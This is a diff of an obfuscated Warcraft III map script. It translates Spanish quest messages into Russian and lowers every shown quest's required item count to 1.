@@ -4664,8 +5852,8 @@ set re[ee]=false
 set ie[ee]="Gnoll"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNGnollKing.blp"
 set ne[ee]="Astucia de los Gnoll, matalos o conquistaran el mundo."
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=7
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="bolas de gnoll."
 set Re[ee]=0
 set Ie[ee]=15
@@ -4677,9 +5865,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(ic())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Vc takes nothing returns boolean
@@ -4697,8 +5885,8 @@ set re[ee]=false
 set ie[ee]="Huesos de Esqueletos"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSkeletonWarrior.blp"
 set ne[ee]="Trae algunos huesos para las mascotas, que tienen un poco de hambre."
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$A
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="huesos."
 set Re[ee]=0
 set Ie[ee]=5
@@ -4710,9 +5898,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Ec())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Rc takes nothing returns boolean
@@ -4730,8 +5918,8 @@ set re[ee]=false
 set ie[ee]="Cripta"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNCryptFiend.blp"
 set ne[ee]="Trae oscuridad de los Demonios de Cripta"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$A
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="oscuridad de demonios."
 set Re[ee]=0
 set Ie[ee]=$A
@@ -4743,9 +5931,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Ic())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function bc takes nothing returns boolean
@@ -4763,8 +5951,8 @@ set re[ee]=false
 set ie[ee]="Zombies"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNCryptFiend.blp"
 set ne[ee]="Consigue carne muerta de los zombies."
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$A
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="carne podrida."
 set Re[ee]=0
 set Ie[ee]=$A
@@ -4776,9 +5964,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Bc())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function dc takes nothing returns boolean
@@ -4796,8 +5984,8 @@ set re[ee]=false
 set ie[ee]="Viaje a Montaña Oscura"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNTombOfRelics.blp"
 set ne[ee]="Mata 10 arañas que estan arriba de Shadow Town."
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$A
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="piernas de arañas."
 set Re[ee]=0
 set Ie[ee]=0
@@ -4809,9 +5997,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Dc())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function gc takes nothing returns boolean
@@ -4830,7 +6018,7 @@ set ie[ee]="Mi Primera Armadura"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTN_RustedArmor_CR.blp"
 set ne[ee]="Mata a 50 Bandidos del Nivel 1."
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=50
+set Ee[ee]=1
 set Xe[ee]="piel de bandido."
 set Re[ee]=0
 set Ie[ee]=0
@@ -4842,9 +6030,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Gc())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function jc takes nothing returns boolean
@@ -4863,7 +6051,7 @@ set ie[ee]="Armadura Verde"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNGreenMetalCarapace.blp"
 set ne[ee]="Mata a 10 Troll de Bosque"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="trolls de bosque."
 set Re[ee]=0
 set Ie[ee]=0
@@ -4875,9 +6063,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Jc())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function lc takes nothing returns boolean
@@ -4896,7 +6084,7 @@ set ie[ee]="Armadura Natural"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNNature Armor.blp"
 set ne[ee]="Mata a 10 Hiper Trolls"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Hiper trolls"
 set Re[ee]=0
 set Ie[ee]=0
@@ -4908,9 +6096,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Lc())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function pc takes nothing returns boolean
@@ -4929,7 +6117,7 @@ set ie[ee]="Armadura de Agua"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNWater Composite Armor.blp"
 set ne[ee]="Mata 10 Sasquash Jovenes."
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Sasquash Jovenes."
 set Re[ee]=0
 set Ie[ee]=0
@@ -4941,9 +6129,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Pc())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function sc takes nothing returns boolean
@@ -4962,7 +6150,7 @@ set ie[ee]="Armadura de Fuego"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNFire Plate Armor.blp"
 set ne[ee]="Mata 10 Osos Salvajes"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Osos Salvajes."
 set Re[ee]=0
 set Ie[ee]=0
@@ -4974,9 +6162,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Sc())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function uc takes nothing returns boolean
@@ -4995,7 +6183,7 @@ set ie[ee]="Armadura de Oscuridad"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNHalf-Armor Of Darkness.blp"
 set ne[ee]="Mata 10 Esqueletos"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Huesos de Esqueletos."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5007,9 +6195,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Uc())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function yc takes nothing returns boolean
@@ -5028,7 +6216,7 @@ set ie[ee]="Armadura de Oro y Plata"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNRoyalArmor.blp.blp"
 set ne[ee]="Mata 10 Demonio Nerubian"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Demonios Nerubian"
 set Re[ee]=0
 set Ie[ee]=0
@@ -5040,9 +6228,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Yc())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function vC takes nothing returns boolean
@@ -5061,7 +6249,7 @@ set ie[ee]="Armadura Dorada"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNHoly Armor.blp"
 set ne[ee]="Mata 10 Brujos Rojos (Laberinto)"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Brujos Rojos"
 set Re[ee]=0
 set Ie[ee]=0
@@ -5073,9 +6261,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(eC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function rC takes nothing returns boolean
@@ -5094,7 +6282,7 @@ set ie[ee]="Armadura Sagrada"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNLion Carapace.blp"
 set ne[ee]="Mata 10 Brujos Verdes (Laberinto)"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Brujos Verdes"
 set Re[ee]=0
 set Ie[ee]=0
@@ -5106,9 +6294,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(iC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function VC takes nothing returns boolean
@@ -5127,7 +6315,7 @@ set ie[ee]="Armadura de Titaneo"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSea Heavy Armor.blp"
 set ne[ee]="Mata 10 Caballeros"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Pedazo de Armadura de Caballeros."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5139,9 +6327,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(EC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function RC takes nothing returns boolean
@@ -5160,7 +6348,7 @@ set ie[ee]="Armadura de las Tormentas"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNWind Armor.blp"
 set ne[ee]="Mata 10 Guerreros Marinos"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Piel de Marinos."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5172,9 +6360,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(IC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function bC takes nothing returns boolean
@@ -5193,7 +6381,7 @@ set ie[ee]="Armadura de Satiro"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNCrowLightArmor.blp"
 set ne[ee]="Mata 10 Piedra"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Rocas."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5205,9 +6393,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(BC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function dC takes nothing returns boolean
@@ -5226,7 +6414,7 @@ set ie[ee]="Armadura de Semidios"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNPowerCarapace.blp"
 set ne[ee]="Mata 10 Tigres"
 set Ve[ee]="Ven a buscar tu Recompenza."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Carne de Trigres."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5238,9 +6426,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(DC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function gC takes nothing returns boolean
@@ -5258,8 +6446,8 @@ set re[ee]=false
 set ie[ee]="Rebuild (5)"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNFrostWyrm.blp"
 set ne[ee]="Mata 50 Dragones de Hielo"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=50
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="Aliento de Dragon Congelado"
 set Re[ee]=0
 set Ie[ee]=0
@@ -5271,9 +6459,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(GC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function jC takes nothing returns boolean
@@ -5291,8 +6479,8 @@ set re[ee]=false
 set ie[ee]="Crias de Lava"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNLavaSpawn.blp"
 set ne[ee]="Elimina 15 Crias de Larva"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=2
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="Crias de Larvas"
 set Re[ee]=0
 set Ie[ee]=0
@@ -5304,9 +6492,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(JC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function lC takes nothing returns boolean
@@ -5324,8 +6512,8 @@ set re[ee]=false
 set ie[ee]="Arañas"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=30
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="arañas"
 set Re[ee]=0
 set Ie[ee]=0
@@ -5337,9 +6525,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(LC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function pC takes nothing returns boolean
@@ -5357,8 +6545,8 @@ set re[ee]=false
 set ie[ee]="Vengadores"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$F
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="vengadores."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5370,9 +6558,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(PC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function sC takes nothing returns boolean
@@ -5390,8 +6578,8 @@ set re[ee]=false
 set ie[ee]="Gigante de Montaña"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$F
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="gigante de montaña."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5403,9 +6591,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(SC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function uC takes nothing returns boolean
@@ -5423,8 +6611,8 @@ set re[ee]=false
 set ie[ee]="Hija de doncella"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=20
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="hijas de doncella"
 set Re[ee]=0
 set Ie[ee]=0
@@ -5436,9 +6624,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(UC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function yC takes nothing returns boolean
@@ -5456,8 +6644,8 @@ set re[ee]=false
 set ie[ee]="Piedra"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=20
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="piedras."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5469,9 +6657,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(YC())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function vd takes nothing returns boolean
@@ -5489,8 +6677,8 @@ set re[ee]=false
 set ie[ee]="Guardianes"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=30
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="guardianes."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5502,9 +6690,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(ed())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function rd takes nothing returns boolean
@@ -5522,8 +6710,8 @@ set re[ee]=false
 set ie[ee]="Evil Fenix"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$F
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="evil fenix."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5535,9 +6723,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(ad())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
